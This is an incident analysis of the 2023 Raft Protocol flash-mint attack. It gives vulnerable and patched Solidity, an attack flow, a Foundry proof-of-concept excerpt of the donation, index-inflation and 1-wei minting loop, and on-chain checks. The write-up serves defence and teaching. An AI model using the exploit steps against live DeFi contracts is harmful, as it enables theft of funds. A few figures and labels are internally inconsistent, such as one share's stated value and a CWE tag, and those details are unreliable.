# Raft Protocol — Flash Mint Precision Attack Analysis

| Item | Details |
|------|------|
| **Date** | 2023-11-10 |
| **Protocol** | Raft Protocol |
| **Chain** | Ethereum |
| **Loss** | ~$3,200,000 (approximately 6,701,624 R stablecoins minted without authorization) |
| **Attacker EOA** | [0xc1f2...39fa](https://etherscan.io/address/0xc1f2b71a502b551a65eee9c96318afdd5fd439fa) |
| **Attack Contract** | [0x0a33...ef8](https://etherscan.io/address/0x0a3340129816a86b62b7eafd61427f743c315ef8) |
| **Attack Tx** | [0xfeed...ce7](https://etherscan.io/tx/0xfeedbf51b4e2338e38171f6e19501327294ab1907ab44cfd2d7e7336c975ace7) |
| **Vulnerable Contract** | [0x9ab6...c244 (PRM)](https://etherscan.io/address/0x9ab6b21cdf116f611110b048987e58894786c244) |
| **Root Cause** | cbETH donation inflates the rcbETH-c index → precision loss causes excessive rcbETH-c minting per 1 wei cbETH → excess R stablecoin issuance using over-collateralized position |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-11/Raft_exp.sol) |

---

## 1. Vulnerability Overview

Raft Protocol is a CDP (Collateralized Debt Position) protocol that accepts collateral such as cbETH and mints the R stablecoin.
Internally, collateral positions are represented as `rcbETH-c` (collateral share token) and `rcbETH-d` (debt share token), with actual asset amounts converted via a cumulative index called `currentIndex`.

The attacker chained two vulnerabilities to mint approximately $3.2M worth of R without authorization:

1. **Index Inflation (Donate Inflate Attack)**: The attacker directly donated 6,000 cbETH to the PRM contract via `transfer()`, then triggered a liquidation to inflate the `rcbETH-c` `currentIndex` by approximately **2,994x**. (Pre-attack: `2.25e34` → Post-attack: `6.74e37`)

2. **Precision Loss (Rounding Error Mint)**: With the index in an inflated state, depositing as little as 1 wei cbETH (= 0.000...001 cbETH) via `managePosition()` results in 1 unit of `rcbETH-c` share being minted due to ceiling division (rounding up) in the internal calculation. This 1 share, converted at the inflated index, is equivalent to thousands of cbETH, allowing a massive amount of R to be minted using it as collateral.

The attacker repeated this loop dozens of times to build an abnormally large collateral position, minted approximately **6,705,028 R**, and realized profits by selling on a DEX.

---

## 2. Vulnerable Code Analysis

### 2.1 ERC20Indexable.mint() — Precision Loss in Share Calculation (Core Vulnerability)

`rcbETH-c` is a share-based token implemented as an `ERC20Indexable` contract.
On mint, shares are calculated by dividing the actual amount (`amount`) by `currentIndex`.

```solidity
// ❌ Vulnerable code — ERC20Indexable.mint()
function mint(address to, uint256 amount) external override {
    // amount: actual quantity of cbETH deposited (in wei)
    // currentIndex: cumulative multiplier of cbETH value per 1 share
    // shares = amount * 1e18 / currentIndex
    // ⚠️ Issue: when currentIndex is inflated to a very large number,
    //           amount=1 wei → shares = 1e18 / (2.994e37) ≈ 0
    //           However, since Solidity uses integer division the result should be 0,
    //           but the internal implementation uses ceiling division (round up), yielding 1
    uint256 shares = amount.mulDivUp(1e18, currentIndex()); // ❌ ceiling division
    _mint(to, shares);
}
```

```solidity
// ✅ Fixed code — add minimum deposit validation
function mint(address to, uint256 amount) external override {
    uint256 index = currentIndex();
    // ✅ Enforce a minimum deposit relative to the index to block 1 wei attacks
    // amount * 1e18 / index >= 1 must hold → amount >= index / 1e18
    require(amount >= index / 1e18, "Deposit amount too small");
    uint256 shares = amount.mulDiv(1e18, index); // ✅ Remove ceiling division (use floor)
    _mint(to, shares);
}
```

**Issue**: Using `mulDivUp` (ceiling division) causes 1 share to be issued even for dust deposits where the division result should converge to 0. When the index is inflated by thousands of times, this 1 share carries the actual collateral value of thousands of cbETH.

---

### 2.2 PositionManager.liquidate() — Missing Validation on Index Reset After Donation

The liquidation function resets the index of `rcbETH-c` based on the amount of collateral the protocol has secured after liquidation. When a large amount of cbETH is introduced while `totalSupply` is extremely small, the index inflates sharply.

```solidity
// ❌ Vulnerable code — index update logic (estimated reproduction)
function _updateIndex(IERC20Indexable collToken) internal {
    uint256 totalAssets = IERC20(collateral).balanceOf(address(this));
    uint256 totalShares = collToken.totalSupply();

    if (totalShares == 0) return;

    // ⚠️ If totalShares is very small and totalAssets is very large,
    //    newIndex = totalAssets * 1e18 / totalShares explodes
    uint256 newIndex = totalAssets.mulDiv(INDEX_PRECISION, totalShares);
    // ❌ No validation on the maximum rate of change relative to the previous index
    collToken.setIndex(newIndex);
}
```

```solidity
// ✅ Fixed code — limit maximum rate of index change
function _updateIndex(IERC20Indexable collToken) internal {
    uint256 totalAssets = IERC20(collateral).balanceOf(address(this));
    uint256 totalShares = collToken.totalSupply();

    if (totalShares == 0) return;

    uint256 newIndex = totalAssets.mulDiv(INDEX_PRECISION, totalShares);
    uint256 oldIndex = collToken.currentIndex();

    // ✅ Block if the index changes by more than 2x in a single transaction
    require(newIndex <= oldIndex * 2, "Index change rate exceeded");
    collToken.setIndex(newIndex);
}
```

**Issue**: The liquidation process calculates the index based on the protocol's actual collateral balance (`balanceOf(address(this))`), so if an attacker inflates the balance by directly donating cbETH, the index inflates along with it. There was no maximum rate-of-change limit to prevent this.

---

### 2.3 PositionManager.managePosition() — Unlimited 1 wei Repeated Deposits

```solidity
// ❌ Vulnerable code — managePosition() missing minimum deposit validation
function managePosition(
    IERC20 collateralToken,
    address position,
    uint256 collateralChange,  // ⚠️ even 1 wei is accepted
    bool isCollateralIncrease,
    uint256 debtChange,
    bool isDebtIncrease,
    uint256 maxFeePercentage,
    ERC20PermitSignature calldata permitSignature
) external returns (uint256, uint256) {
    // ❌ Processes as long as collateralChange > 0 — 1 wei passes through
    if (isCollateralIncrease && collateralChange > 0) {
        _increaseCollateral(position, collateralChange);
    }
    // ...
}
```

```solidity
// ✅ Fixed code — enforce minimum meaningful deposit amount
function managePosition(...) external returns (uint256, uint256) {
    if (isCollateralIncrease && collateralChange > 0) {
        // ✅ Only allow amounts that result in at least 1 share at the current index
        uint256 minDeposit = collToken.currentIndex() / INDEX_PRECISION + 1;
        require(collateralChange >= minDeposit, "Collateral below minimum");
        _increaseCollateral(position, collateralChange);
    }
}
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

- The attacker started with 1.5 cbETH and 3,405 R (obtained via `deal()` in the PoC).
- The attacker EOA (`0xc1f2...`) requests a flash loan from AaveV3 through the attack contract (`0x0a33...`).
- `liquidablePosition` (`0x0119...`): An existing position already in a liquidatable state.

### 3.2 Execution Phase

```
┌─────────────────────────────────────────────────────┐
│  Attacker Contract (0x0a33...ef8)                    │
│  Request flash loan of 6,000 cbETH from AaveV3       │
└──────────────────────┬──────────────────────────────┘
                       │ Receive 6,000 cbETH
                       ▼
┌─────────────────────────────────────────────────────┐
│  [PHASE 1] Index Inflation                           │
│                                                     │
│  1. cbETH.transfer(PRM, 6001.45 cbETH)              │
│     → Donate cbETH directly to PRM contract         │
│       (donate attack)                               │
│                                                     │
│  2. PRM.liquidate(liquidablePosition)               │
│     → Trigger liquidation: recalculate              │
│       rcbETH-c index                               │
│     → Index: 2.25e34 → 6.74e37 (~2,994x inflation) │
└──────────────────────┬──────────────────────────────┘
                       │ Index inflated 2994x
                       ▼
┌─────────────────────────────────────────────────────┐
│  [PHASE 2] Exploit Precision Loss — Repeat Loop      │
│                                                     │
│  for i in range(60 + rcbETH_c_HeldByAttacker):      │
│    PRM.managePosition(cbETH, self, 1 wei, ...)       │
│    → Deposit 1 wei cbETH                           │
│    → mulDivUp(1 wei, 1e18, 6.74e37) = 1 (ceil)      │
│    → Mint 1 rcbETH-c share                         │
│      (actual value: ~3,000 cbETH)                  │
│                                                     │
│  ~dozens of iterations →                            │
│  attacker's rcbETH-c balance explodes               │
└──────────────────────┬──────────────────────────────┘
                       │ Over-collateralized position built
                       ▼
┌─────────────────────────────────────────────────────┐
│  [PHASE 3] Withdraw cbETH + Mint R                  │
│                                                     │
│  3. PRM.managePosition(cbETH, self, PRM_balance,    │
│       collateralDecrease=true)                      │
│     → Withdraw full 6,003.44 cbETH donated earlier  │
│                                                     │
│  4. PRM.managePosition(cbETH, self, 0, true,        │
│       debtChange=6,705,028 R, isDebtIncrease=true)  │
│     → Mint 6,705,028 R against inflated             │
│       collateral position                           │
└──────────────────────┬──────────────────────────────┘
                       │ Acquire 6,705,028 R
                       ▼
┌─────────────────────────────────────────────────────┐
│  [PHASE 4] Swap R → ETH/cbETH to Realize Profits    │
│                                                     │
│  5. Swap 200,000 R in R/USDC Uniswap V3 pool        │
│     → Receive 2,009,226 sDAI                        │
│  6. Swap 1,200,000 R → DAI                         │
│  7. DAI → WETH (Uniswap V3)                        │
│  8. Unwrap WETH → ETH                              │
│  9. Curve cbETH/ETH pool: 5 ETH → 4.74 cbETH       │
│                                                     │
│  10. Repay 6,003 cbETH flash loan to AaveV3         │
└──────────────────────┬──────────────────────────────┘
                       │
                       ▼
               Attacker Final Profit:
               - ~3,322,461 R remaining
               - 4.74 cbETH
               - Total ~$3.2M
```

### 3.3 Outcome

| Item | Value |
|------|------|
| Flash loan obtained | 6,000 cbETH (AaveV3) |
| cbETH donated | 6,001.45 cbETH |
| Index inflation multiplier | ~2,994x |
| Unauthorized R minted | ~6,705,028 R |
| Flash loan repaid | 6,003 cbETH |
| Attacker's final R balance | ~3,322,461 R |
| Estimated loss | ~$3,200,000 |

---

## 4. PoC Code (Key Logic Excerpt + Comments)

```solidity
// ===== [Step 1] Initial Test Conditions =====
function testExploit() external {
    // Start with 1.5 cbETH and 3,405 R
    deal(address(cbETH), address(this), 1.5 ether);
    deal(address(R), address(this), 3405 ether);

    // Directly mint rcbETH-d to satisfy the minimum debt requirement (3,000 R)
    // by impersonating PRM
    vm.startPrank(address(PRM));
    rcbETH_d.mint(address(this), 3100 ether);
    vm.stopPrank();

    // Request a flash loan of 6,000 cbETH from AaveV3
    aaveV3.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);
}

// ===== [Step 2] Core Attack Logic Inside Flash Loan Callback =====
function executeOperation(...) external returns (bool) {
    // [2-1] Record current index before attack
    uint256 storedindex1 = rcbETH_c.currentIndex();
    // storedindex1 ≈ 2.25e34

    // [2-2] Donate all cbETH to the PRM contract (donate attack)
    cbETH.transfer(address(PRM), cbETH.balanceOf(address(this)));

    // [2-3] Trigger liquidation → PRM resets index based on cbETH balance
    //       Donation causes PRM's cbETH balance to explode → index inflates 2994x
    PRM.liquidate(liquidablePosition);

    uint256 storedindex2 = rcbETH_c.currentIndex();
    // storedindex2 ≈ 6.74e37 (2994x increase)

    // [2-4] Repeatedly deposit 1 wei cbETH under the inflated index
    //       1 wei / (6.74e37) = ceiling operation yields share of 1
    //       This 1 share = 6.74e37 / 1e18 ≈ 6.74e19 cbETH value (abnormal)
    for (uint256 i; i < (60 + rcbETH_c_HeldbyAttacker); i++) {
        PRM.managePosition(
            cbETH,
            address(this),
            1,          // ← deposit only 1 wei cbETH
            true,       // isCollateralIncrease = true
            0,
            true,
            1e18,
            ERC20PermitSignature(...)
        );
    }

    // [2-5] Withdraw the full cbETH balance accumulated in PRM
    // (recover the donated cbETH)
    uint256 collateralChange = cbETH.balanceOf(address(PRM));
    PRM.managePosition(cbETH, address(this), collateralChange, false, ...);

    // [2-6] Mint maximum R stablecoins against the inflated collateral position
    //       Calculate max debtChange based on 130% collateral ratio
    uint256 collateralAmount = rcbETH_c.balanceOf(address(this));
    uint256 debtChange = collateralAmount * EtherPrice * 100 / 130
                         - rcbETH_d.balanceOf(address(this));
    PRM.managePosition(cbETH, address(this), 0, true, debtChange, true, 1e18, ...);

    // [2-7] Swap R → ETH/cbETH to realize profits
    RTocbETH();
    return true;
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern |
|----|--------|--------|-----|-----------|
| V-01 | Index Inflation (Donate Inflate Attack) | CRITICAL | CWE-682 | `16_accounting_sync.md`, `05_integer_issues.md` |
| V-02 | Precision Loss via Ceiling Division in Share Minting | CRITICAL | CWE-190 | `05_integer_issues.md` |
| V-03 | Missing Minimum Deposit Validation in managePosition() | HIGH | CWE-20 | `11_logic_error.md` |
| V-04 | Flash Loan-Based Index Manipulation | HIGH | CWE-841 | `02_flash_loan.md` |

### V-01: Index Inflation (Donate Inflate Attack)
- **Description**: When an attacker directly donates cbETH to the PRM contract via `transfer()`, `balanceOf(address(PRM))` increases. During liquidation, `rcbETH-c`'s `currentIndex` is recalculated based on this balance. With an extremely small total supply against a massive balance, the index inflated approximately 2,994x.
- **Impact**: Index inflation theoretically multiplies the value of all existing share holders by thousands, but subsequently allows shares to be minted without actual collateral via the 1 wei attack, rendering the protocol insolvent.
- **Attack Conditions**: A liquidatable position must exist, `totalSupply` must be small, and a large amount of collateral must be available to donate.
- **Similar Cases**: Euler Finance ($197M, 2023) — abuse of `donateToReserves()` function; Hundred Finance ($7M, 2023) — First Depositor Attack

### V-02: Precision Loss via Ceiling Division in Share Minting
- **Description**: `ERC20Indexable.mint()` uses `mulDivUp(amount, 1e18, currentIndex)` to calculate shares. When the index is very large and the amount is 1 wei, the share count that should mathematically be 0 is rounded up to 1. This 1 share, converted at the inflated index, carries the collateral value of thousands of cbETH.
- **Impact**: A collateral position worth tens of thousands of times the actual deposited value can be created per 1 wei deposit.
- **Attack Conditions**: Requires index to be inflated via V-01. Shares are accumulated through a repeat loop.

### V-03: Missing Minimum Deposit Validation in managePosition()
- **Description**: A call with `collateralChange = 1` (1 wei) is processed without any minimum-value check. In normal usage this deposit size is meaningless, but in an index-inflated state it becomes a critical vulnerability.
- **Impact**: The attacker can expand a position indefinitely without real collateral through dozens of repeated calls.
- **Attack Conditions**: Chained with V-01 and V-02.

### V-04: Flash Loan-Based Index Manipulation
- **Description**: A flash loan was used to source a large amount of collateral, amplifying the scale of the donation attack. Without a donation of 6,000 cbETH, the index inflation would not have been sufficient for the attack.
- **Impact**: Enables large-scale index manipulation without requiring owned collateral.
- **Attack Conditions**: Requires access to a flash loan provider (AaveV3).

---

## 6. Remediation Recommendations

### Immediate Actions

**[Fix 1] ERC20Indexable.mint() — Remove Ceiling Division and Enforce Minimum Deposit**

```solidity
// ✅ Fix: use floor division + revert if result is 0 shares
function mint(address to, uint256 amount) external override {
    uint256 index = currentIndex();
    uint256 shares = amount.mulDiv(1e18, index); // floor division
    // Reject if 1 wei deposit yields 0 shares (or enforce minimum deposit)
    require(shares > 0, "Deposit too small relative to index");
    _mint(to, shares);
}
```

**[Fix 2] Index Update — Limit Maximum Rate of Change**

```solidity
// ✅ Fix: cap index change rate within a single transaction
function _setIndex(uint256 newIndex) internal {
    uint256 oldIndex = _currentIndex;
    // Block if index increases by more than 2x
    require(newIndex <= oldIndex * 2 || oldIndex == 0, "Abnormal index spike detected");
    _currentIndex = newIndex;
    emit IndexUpdated(newIndex);
}
```

**[Fix 3] PositionManager — Separate Donated Balance from Accounting Balance**

```solidity
// ✅ Fix: use internal accounting balance instead of actual balance for index calculation
// Use internal tracking variable instead of balanceOf(address(this))
uint256 private _trackedCollateralBalance;

function _increaseCollateral(...) internal {
    token.transferFrom(msg.sender, address(this), amount);
    _trackedCollateralBalance += amount; // update accounting balance
}

function _updateIndex(...) internal {
    // Use internal tracked value instead of balanceOf() → neutralizes donate attack
    uint256 totalAssets = _trackedCollateralBalance;
    ...
}
```

### Structural Improvements

| Vulnerability | Recommended Fix |
|--------|-----------|
| V-01 Index Inflation | Separate internal accounting balance from actual balance; prohibit direct reference to `balanceOf()` |
| V-02 Ceiling Division | Use `mulDiv()` (floor) for share calculation; minimum deposit = `index / 1e18 + 1` |
| V-03 Minimum Deposit | Add `minCollateralChange` parameter to `managePosition()` or enforce internal minimum validation |
| V-04 Flash Loan | Monitor index change rate within a single transaction; pause on anomaly |
| Common | Introduce a circuit breaker for index changes |

---

## 7. Lessons Learned

1. **Never use `balanceOf(address(this))` directly**: Anyone can donate tokens to a contract via ERC20 `transfer()`. Internal accounting must use a tracked balance (internal variable), not the actual balance (`balanceOf`). This is a recurring pattern in incidents involving Euler Finance, Compound, Hundred Finance, and others.

2. **Ceiling division in share-based protocols is a double-edged sword**: `mulDivUp()` is a standard pattern intended to protect depositors, but combined with an index inflation attack it becomes a critical vulnerability. Share issuance must always be accompanied by minimum input amount validation.

3. **Circuit breakers are necessary for sudden index/exchange rate changes**: If a core accounting variable like `currentIndex` or `exchangeRate` changes by thousands of times within a single transaction, this is an obvious anomaly. A safeguard limiting the maximum rate of change (e.g., no more than 2x within a single block) must always be implemented.

4. **Liquidation is a particularly sensitive code path in CDP protocols**: Liquidation changes multiple internal states (index, total supply, collateral balance) simultaneously. If this code path can be triggered arbitrarily by an attacker, state invariants before and after liquidation must be thoroughly validated.

5. **Connection to the First Depositor / Empty Market attack pattern**: This attack is analogous to the "First Depositor Attack" in Compound fork protocols, in that it inflates the index by injecting a large amount of assets when `totalSupply` is extremely small. Whenever a new collateral type is added, the possibility of index manipulation under initial liquidity conditions must always be examined.

---

## 8. On-Chain Verification

### 8.1 Transaction Basic Information

| Item | Value |
|------|-----|
| Block Number | 18,543,486 |
| Attacker EOA | `0xc1f2b71A502B551a65Eee9C96318aFdD5fd439fA` |
| Attack Contract (to) | `0x0A3340129816a86b62b7eafD61427f743c315ef8` |
| Gas Limit | 8,000,000 |
| Total Log Events | 384 |
| Transfer Event Count | 161 |
| Transaction Status | Success (0x1) |

### 8.2 PoC vs On-Chain Amount Comparison

| Item | PoC Expected | On-Chain Actual | Match |
|------|-----------|------------|----------|
| Flash loan cbETH | 6,000 ETH | 6,000.000 cbETH | ✅ Match |
| Donated cbETH (transferred to PRM) | ~6,001 cbETH | 6,001.446 cbETH | ✅ Approximate match |
| Index inflation multiplier | "magnification factor" (console output) | **2,993.9x** | ✅ Confirmed |
| Total unauthorized R minted | ~6.7M R | 6,705,028.47 R | ✅ Approximate match |
| R balance after attack | console output | 3,322,460.97 R | ✅ Confirmed |
| cbETH withdrawn | ~6,003 cbETH | 6,003.441 cbETH | ✅ Match |
| AaveV3 repaid cbETH | 6,000 + fee | 6,003.000 cbETH | ✅ Match |

### 8.3 rcbETH-c Index Change (On-Chain Verification)

| Item | Value |
|------|-----|
| currentIndex before attack | `22,528,727,648,486,975,235,001,271,078,722,143` |
| currentIndex after attack | `67,454,393,618,383,108,811,022,471,910,112,359,551` |
| Actual inflation multiplier | **2,993.9x** |
| R totalSupply change | 13.02M → 19.72M (~6.7M R increase) |

### 8.4 On-Chain Event Flow (Key Sequence)

1. AaveV3 → Attack contract: Transfer 6,000 cbETH (flash loan)
2. Attack contract → PRM: Transfer 6,001.45 cbETH (donation)
3. PRM: Liquidate rcbETH-d, update rcbETH-c/d index (early among 161 events)
4. Attack contract → PRM: 1 wei cbETH × dozens of iterations → rcbETH-c 0 mint × dozens of times (actual value rounds to 1)
5. PRM → Attack contract: Return 6,003.44 cbETH (collateral withdrawal)
6. PRM → Attack contract: Mint 6,705,028.47 R (debt issuance)
7. R → sDAI swap (Uniswap V3 R/USDC pool)
8. R → DAI swap
9. DAI → WETH swap
10. Unwrap WETH → ETH
11. ETH → cbETH (Curve cbETH/ETH pool)
12. Attack contract → AaveV3: Repay 6,003 cbETH

### 8.5 Precondition Verification (Block 18,543,485 — Immediately Before Attack)

| Item | Value |
|------|-----|
| rcbETH-c totalSupply | 4.010 cbETH (extremely small — vulnerable state for index inflation) |
| cbETH balance in PRM | 4.000 cbETH |
| R totalSupply | ~13,022,232 R |
| rcbETH-c currentIndex | `2.25e34` |

It was confirmed on-chain that the conditions for ~2994x index inflation were met: with a totalSupply of only 4 cbETH, a donation of 6,000 cbETH caused the index to inflate approximately 2,994x.